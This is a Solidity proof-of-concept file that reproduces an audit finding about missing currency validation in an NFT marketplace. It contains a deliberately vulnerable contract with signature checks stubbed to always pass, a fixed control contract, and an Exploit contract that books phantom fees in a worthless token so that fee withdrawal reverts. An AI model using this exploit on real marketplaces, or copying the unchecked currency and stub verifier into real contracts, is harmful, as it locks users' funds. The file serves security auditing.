// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62542:
// "[H-05] Currency validation missing in listing and offer requests".
//
// The Marketplace lets each ListingRequest/OfferRequest carry its OWN currency
// but never validates it against the contract's single stored `acceptedCurrency`.
// In acceptOffer the seller and the protocol fee are paid in the user-supplied
// `offerCurrency`, yet the fee is booked into the single scalar
// `totalPendingFees` as if it had been received in `acceptedCurrency`.
//
// An attacker submits an offer denominated in a worthless token: the contract
// books a phantom fee it never received in `acceptedCurrency`, inflating
// `totalPendingFees` above the real `acceptedCurrency` balance. The ONLY fee
// withdrawal path — `emergencyShutdown`, which transfers `totalPendingFees` in
// `acceptedCurrency` — then permanently reverts, locking the legitimate fees.
//
// Verbatim-embedded from the finding: the two request structs, `isValidListing`,
// the `buy`/`acceptOffer` payment+accounting lines, and `emergencyShutdown`.
// The surrounding function bodies are minimally reconstructed; signature and
// whitelist checks are stubbed as ORTHOGONAL (the missing currency check is
// precisely the bug, so an absent check is faithful).
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IWhitelistRegistry {
    function isWhitelisted(address token) external view returns (bool);
}

/// @dev Orthogonal-to-this-finding stub. Signature validity is NOT what the H-05
///      finding is about (the bug is the missing currency check); a faithful
///      reduction stubs it. See finding caveats.
library SignatureChecker {
    function isValidSignatureNow(address, bytes32, bytes memory) internal pure returns (bool) {
        return true;
    }
}

// ── verbatim request structs from the finding (markdown bold markers stripped) ──
struct ListingRequest {
    address tokenContractAddress;
    uint256 tokenId;
    uint256 price;
    address acceptedCurrency;
    uint256 deadline;
    address owner;
    uint256 chainId;
}

struct OfferRequest {
    address tokenContractAddress;
    uint256 tokenId;
    uint256 price;
    address offerCurrency;
    uint256 deadline;
    address requester;
    uint256 chainId;
}

struct ListingParams {
    ListingRequest request;
    bytes sig;
    address receiver;
    bytes receiverSig;
}

struct OfferParams {
    OfferRequest request;
    bytes sig;
    address receiver;
    bytes receiverSig;
}

// custom errors referenced by the verbatim isValidListing body
error InvalidPrice();
error ListingExpired();
error InvalidChainId();
error ListingAlreadyUsed();
error NFTNotWhitelisted();
error NotOwner();
error InvalidSignature();
error MismatchedCurrency();

/// @dev Minimal faithful ERC20 double for the opaque token boundary. Balance-checked
///      transfers (Solidity 0.8 reverts on underflow) so an over-book truly reverts.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE Marketplace. Carries the verbatim vulnerable lines from the finding.
// ─────────────────────────────────────────────────────────────────────────────
contract Marketplace {
    uint256 internal constant BASIS_POINTS_DENOMINATOR = 10000;

    address public acceptedCurrency;
    address public marketplaceAdmin;
    address public feeReceiver;
    uint256 public feeBps;
    uint256 public totalPendingFees;

    address public whitelistRegistry;
    mapping(bytes32 => bool) public usedListings;

    constructor(address _acceptedCurrency, address _marketplaceAdmin, address _feeReceiver, uint256 _feeBps) {
        acceptedCurrency = _acceptedCurrency;
        marketplaceAdmin = _marketplaceAdmin;
        feeReceiver = _feeReceiver;
        feeBps = _feeBps;
    }

    function generateListingSignatureHash(ListingRequest memory request) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                request.tokenContractAddress,
                request.tokenId,
                request.price,
                request.acceptedCurrency,
                request.deadline,
                request.owner,
                request.chainId
            )
        );
    }

    // ── verbatim isValidListing from the finding (embedded as evidence that NO
    //    currency validation exists on the listing/offer path) ──
    function isValidListing(ListingParams calldata listing) public view returns (bool) {
        if (listing.request.price == 0) revert InvalidPrice();
        if (block.timestamp > listing.request.deadline) revert ListingExpired();
        if (listing.request.chainId != block.chainid) revert InvalidChainId();
        bytes32 listingHash = generateListingSignatureHash(listing.request);
        if (usedListings[listingHash]) revert ListingAlreadyUsed();
        if (!IWhitelistRegistry(whitelistRegistry).isWhitelisted(listing.request.tokenContractAddress)) {
            revert NFTNotWhitelisted();
        }
        if (IERC721(listing.request.tokenContractAddress).ownerOf(listing.request.tokenId) != listing.request.owner) {
            revert NotOwner();
        }

        if (!SignatureChecker.isValidSignatureNow(listing.request.owner, listingHash, listing.sig)) {
            revert InvalidSignature();
        }

        if (
            msg.sender != listing.receiver
                && !SignatureChecker.isValidSignatureNow(listing.receiver, listingHash, listing.receiverSig)
        ) {
            revert InvalidSignature();
        }

        return true;
    }

    // Mirror bug (finding, buy): payment uses the CURRENT `acceptedCurrency`, not
    // `listings[i].request.acceptedCurrency` the listing was signed with. Body is
    // reconstructed around the verbatim payment lines; not on the exploited path.
    function buy(ListingParams[] calldata listings, address payee) external {
        for (uint256 i = 0; i < listings.length; i++) {
            uint256 price = listings[i].request.price;
            uint256 feeAmount = (price * feeBps) / BASIS_POINTS_DENOMINATOR;
            uint256 sellerAmount = price - feeAmount;

            // Update state before external calls
            totalPendingFees += feeAmount;
            // External calls after state changes
            IERC20(acceptedCurrency).transferFrom(payee, listings[i].request.owner, sellerAmount);
            IERC20(acceptedCurrency).transferFrom(payee, address(this), feeAmount);
        }
    }

    // Reconstructed acceptOffer body carrying the VERBATIM accounting/payment lines.
    // There is deliberately NO `offerCurrency == acceptedCurrency` check (the H-05 bug).
    function acceptOffer(OfferParams[] calldata offers) external {
        for (uint256 i = 0; i < offers.length; i++) {
            // (signature/whitelist validation stubbed — orthogonal to this finding)
            uint256 price = offers[i].request.price;
            uint256 feeAmount = (price * feeBps) / BASIS_POINTS_DENOMINATOR;
            uint256 sellerAmount = price - feeAmount;

            // Update state before external calls
            totalPendingFees += feeAmount; // @> fee booked into the single acceptedCurrency-denominated scalar while it is actually collected in offerCurrency below (no offerCurrency==acceptedCurrency check) -> phantom, unbacked fees
            // External calls after state changes
            IERC20(offers[i].request.offerCurrency).transferFrom(offers[i].request.requester, offers[i].receiver, sellerAmount);
            IERC20(offers[i].request.offerCurrency).transferFrom(offers[i].request.requester, address(this), feeAmount);
        }
    }

    // ── verbatim emergencyShutdown from the finding ──
    function emergencyShutdown() external {
        require(msg.sender == marketplaceAdmin, "Only marketplaceAdmin can call");
        // First collect any pending fees
        uint256 amount = totalPendingFees;
        if (amount > 0 && acceptedCurrency != address(0)) {
            totalPendingFees = 0;
            IERC20(acceptedCurrency).transfer(feeReceiver, amount);
        }
        // Set currency to address(0) to prevent any new trades
        acceptedCurrency = address(0);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED Marketplace (negative control): acceptOffer rejects a mismatched currency,
// so totalPendingFees can only ever be backed by real acceptedCurrency.
// ─────────────────────────────────────────────────────────────────────────────
contract MarketplaceFixed {
    uint256 internal constant BASIS_POINTS_DENOMINATOR = 10000;

    address public acceptedCurrency;
    address public marketplaceAdmin;
    address public feeReceiver;
    uint256 public feeBps;
    uint256 public totalPendingFees;

    constructor(address _acceptedCurrency, address _marketplaceAdmin, address _feeReceiver, uint256 _feeBps) {
        acceptedCurrency = _acceptedCurrency;
        marketplaceAdmin = _marketplaceAdmin;
        feeReceiver = _feeReceiver;
        feeBps = _feeBps;
    }

    function acceptOffer(OfferParams[] calldata offers) external {
        for (uint256 i = 0; i < offers.length; i++) {
            // FIX: the currency in the request MUST match the contract's acceptedCurrency.
            if (offers[i].request.offerCurrency != acceptedCurrency) revert MismatchedCurrency();

            uint256 price = offers[i].request.price;
            uint256 feeAmount = (price * feeBps) / BASIS_POINTS_DENOMINATOR;
            uint256 sellerAmount = price - feeAmount;

            totalPendingFees += feeAmount;
            IERC20(offers[i].request.offerCurrency).transferFrom(offers[i].request.requester, offers[i].receiver, sellerAmount);
            IERC20(offers[i].request.offerCurrency).transferFrom(offers[i].request.requester, address(this), feeAmount);
        }
    }

    function emergencyShutdown() external {
        require(msg.sender == marketplaceAdmin, "Only marketplaceAdmin can call");
        uint256 amount = totalPendingFees;
        if (amount > 0 && acceptedCurrency != address(0)) {
            totalPendingFees = 0;
            IERC20(acceptedCurrency).transfer(feeReceiver, amount);
        }
        acceptedCurrency = address(0);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver (cheatcode-free). One legit USDC-denominated offer books a real,
// backed fee F; one attacker offer denominated in a worthless token books ANOTHER
// F that the contract never received in USDC. The fee-withdrawal path
// (emergencyShutdown) then reverts permanently, locking the real F of USDC.
// The locked magnitude is recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant FEE_RECEIVER = 0x0000000000000000000000000000000000000055;
    address internal constant SELLER = 0x0000000000000000000000000000000000000077;

    uint256 internal constant PRICE = 40_000_000_000; // 40,000 USDC @ 6 decimals
    uint256 internal constant FEE = 1_000_000_000; //  1,000 USDC (2.5% of PRICE)

    // Exposed results for the driver / Playground.
    uint256 public buggyTotalPendingFees; // == 2F (F real + F phantom)
    uint256 public backedUsdc; // == F  (only the legit fee is real USDC)
    uint256 public phantomFees; // == F  (booked but never received in acceptedCurrency)
    bool public shutdownReverted; // fee withdrawal bricked
    uint256 public lockedRealUsdc; // == F  (real fees now unwithdrawable)
    uint256 public sinkMarkerBalance;

    address public marketplaceAddr;
    address public usdcAddr;
    address public markerAddr;

    function _offer(address currency) internal view returns (OfferParams memory p) {
        p.request = OfferRequest({
            tokenContractAddress: address(0),
            tokenId: 0,
            price: PRICE,
            offerCurrency: currency,
            deadline: type(uint256).max,
            requester: address(this),
            chainId: block.chainid
        });
        p.sig = "";
        p.receiver = SELLER;
        p.receiverSig = "";
    }

    function run() external payable {
        // --- deploy doubles (fixed order, marker LAST) ---
        MiniToken usdc = new MiniToken("USD Coin", "USDC", 6); // nonce 1
        MiniToken worthless = new MiniToken("Worthless", "WORTH", 18); // nonce 2
        Marketplace mkt = new Marketplace(address(usdc), address(this), FEE_RECEIVER, 250); // nonce 3
        MiniToken marker = new MiniToken("Locked USDC Marker", "LOCKED-USDC", 6); // nonce 4 (LAST)

        usdcAddr = address(usdc);
        marketplaceAddr = address(mkt);
        markerAddr = address(marker);

        // Exploit acts as the offer requester for both offers: holds each token and
        // approves the marketplace to pull payment (cheatcode-free, single actor).
        usdc.mint(address(this), PRICE);
        worthless.mint(address(this), PRICE);
        usdc.approve(address(mkt), type(uint256).max);
        worthless.approve(address(mkt), type(uint256).max);

        // (1) LEGIT offer in acceptedCurrency (USDC): books F, contract truly holds F USDC.
        OfferParams[] memory legit = new OfferParams[](1);
        legit[0] = _offer(address(usdc));
        mkt.acceptOffer(legit);

        // (2) ATTACKER offer in a worthless token: books ANOTHER F (phantom); the
        //     contract receives WORTH, never USDC, for this fee.
        OfferParams[] memory atk = new OfferParams[](1);
        atk[0] = _offer(address(worthless));
        mkt.acceptOffer(atk);

        buggyTotalPendingFees = mkt.totalPendingFees(); // 2F
        backedUsdc = usdc.balanceOf(address(mkt)); // F
        phantomFees = buggyTotalPendingFees - backedUsdc; // F unbacked

        // (3) The only fee-withdrawal path now permanently reverts: it tries to send
        //     2F of acceptedCurrency but only F is held.
        bool reverted;
        try mkt.emergencyShutdown() {
            reverted = false;
        } catch {
            reverted = true;
        }
        shutdownReverted = reverted;
        require(shutdownReverted, "expected emergencyShutdown to revert (fees locked)");

        // The shutdown never completed, so acceptedCurrency was NOT zeroed and the
        // real USDC fees are permanently stranded.
        require(mkt.acceptedCurrency() == address(usdc), "shutdown must not have completed");
        lockedRealUsdc = usdc.balanceOf(address(mkt)); // F, unwithdrawable

        // Record the harmed magnitude (real USDC locked) on the marker at the SINK.
        marker.mint(SINK, lockedRealUsdc);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
